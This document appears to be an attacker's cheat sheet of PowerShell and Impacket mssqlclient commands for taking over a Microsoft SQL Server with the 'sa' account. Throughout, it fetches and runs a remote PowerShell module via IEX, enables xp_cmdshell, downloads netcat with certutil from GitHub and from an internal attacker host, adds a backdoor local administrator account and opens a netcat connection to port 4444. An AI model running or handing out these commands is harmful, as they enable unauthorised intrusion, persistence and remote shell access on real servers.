
```
$browser = New-Object System.Net.WebClient
$browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials
IEX($browser.DownloadString("https://gist.githubusercontent.com/jourdant/e9fa625fec54deb1a31f8e441157fc9f/raw/20cca64e2909033a778c5b56f9040915708de237/sql_cmdlets.psm1"))
```

```


Invoke-SqlCommand -Server 192.168.100.99 -database master -username sa -password 123456@!@# -query "EXEC sp_databases"
$sql = "EXEC sp_configure 'show advanced options',1;reconfigure; exec sp_configure 'xp_cmdshell',1;reconfigure" 
Invoke-SqlCommand -server 192.168.100.99 -database master -username sa -password 123456@!@# -query $sql
Invoke-SqlCommand -server 192.168.100.99 -database master -username sa -password 123456@!@# -query "exec xp_cmdshell 'hostname'"
Invoke-SqlCommand -server 192.168.100.99 -database master -username sa -password 123456@!@# -query "exec xp_cmdshell 'ipconfig'"
Invoke-SqlCommand -server 192.168.100.99 -database master -username sa -password 123456@!@# -query "exec xp_cmdshell 'certutil.exe -urlcache -split -f https://github.com/diegocr/netcat/raw/master/nc.exe'"
Invoke-SqlCommand -server 192.168.100.99 -database master -username sa -password 123456@!@# -query "exec xp_cmdshell 'net localgroup administrators'"
#$command = "net localgroup administrators /add pornstar"
#Invoke-SqlCommand -server 192.168.100.99 -database master -username sa -password 123456@!@# -query "exec xp_cmdshell '$command'"
#Invoke-SqlCommand -server 192.168.100.99 -database master -username sa -password 123456@!@# -query "exec xp_cmdshell 'net localgroup administrators /add pornstar'"
Invoke-SqlCommand -server 192.168.100.99 -database master -username sa -password 123456@!@# -query "exec xp_cmdshell 'net user NyaMeeEain 123456@aA /add'"
Invoke-SqlCommand -server 192.168.100.99 -database master -username sa -password 123456@!@# -query "exec xp_cmdshell 'net localgroup administrators /add NyaMeeEain'"
net localgroup administrators /add pornstar
```
```
python mssqlclient.py sa:123456@192.168.100.120
> EXEC sp_configure 'show advanced options', 1;
> EXEC sp_configure reconfigure;
> EXEC sp_configure 'xp_cmdshell', 1;
> EXEC sp_configure reconfigure;
> EXEC master.dbo.xp_cmdshell 'whoami';
> EXEC master.dbo.xp_cmdshell 'net localgroup administrators';
> EXEC master.dbo.xp_cmdshell 'net user NyaMeeEain 123456@aA /adds';
> EXEC master.dbo.xp_cmdshell 'net localgroup administrators /add NyaMeeEain';
> EXEC master.dbo.xp_cmdshell 'certutil.exe -urlcache -split -f http://192.168.100.104:9090/nc.exe c:\windows\Users\Public\nc.exe';
> EXEC master.dbo.xp_cmdshell 'nc.exe -nv 192.168.100.104 4444';
```



